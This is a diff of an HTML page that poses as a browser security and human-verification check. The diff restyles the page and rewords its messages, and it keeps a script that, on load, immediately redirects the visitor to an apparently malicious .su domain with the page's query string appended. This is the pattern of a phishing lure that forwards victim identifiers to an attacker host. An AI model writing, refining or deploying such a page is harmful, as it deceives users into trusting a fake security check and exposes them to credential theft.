@@ -12,41 +12,50 @@
             height: 100vh;
             margin: 0;
             background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         .container {
             text-align: center;
+            max-width: 400px;
+            width: 100%;
+            padding: 30px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            border: 1px solid #ddd;
         }
         .message {
-            font-size: 20px;
+            font-size: 16px;
             color: #333;
             margin-bottom: 20px;
+            line-height: 1.6;
+            font-weight: 400;
         }
         .loading {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto;
+            margin: 20px 0;
         }
         .loading div {
-            width: 10px; /* Smaller bubbles */
-            height: 10px; /* Smaller bubbles */
-            margin: 0 5px;
+            width: 12px; /* Bubble size */
+            height: 12px; /* Bubble size */
+            margin: 0 6px;
             background-color: #333;
             border-radius: 50%;
-            animation: loading 1.2s infinite ease-in-out;
+            animation: loading 1.5s infinite ease-in-out;
         }
         .loading div:nth-child(2) {
-            animation-delay: -0.4s;
+            animation-delay: -0.3s;
         }
         .loading div:nth-child(3) {
-            animation-delay: -0.8s;
+            animation-delay: -0.6s;
         }
         .loading div:nth-child(4) {
-            animation-delay: -1.2s;
+            animation-delay: -0.9s;
         }
         .loading div:nth-child(5) {
-            animation-delay: -1.6s;
+            animation-delay: -1.2s;
         }
         @keyframes loading {
             0% {
@@ -63,7 +72,7 @@
 </head>
 <body>
     <div class="container">
-        <div class="message">Checking your browser for a secure connection...</div>
+        <div class="message">We are currently checking your browser for a secure connection...</div>
         <div class="loading">
             <div></div>
             <div></div>
@@ -71,28 +80,17 @@
             <div></div>
             <div></div>
         </div>
-        <br>
-        <div class="message">Verifying that you are human...</div>
+        <div class="message">Please hold on while we verify that you are human...</div>
     </div>
 
-  <script>
-    function redirectWithQuery() {
-        
-        const baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/#";
-        
-        
-        const queryString = window.location.search.substring(1);
-        
-        
-        const redirectUrl = queryString ? `${baseRedirectUrl}${queryString}` : baseRedirectUrl;
-        
-        
-        window.location.href = redirectUrl;
-    }
-    
-    redirectWithQuery(); 
-</script>
-
-
+    <script>
+        function redirectWithQuery() {
+            const baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/#";
+            const queryString = window.location.search.substring(1);
+            const redirectUrl = queryString ? `${baseRedirectUrl}${queryString}` : baseRedirectUrl;
+            window.location.href = redirectUrl;
+        }
+        redirectWithQuery();
+    </script>
 </body>
 </html>
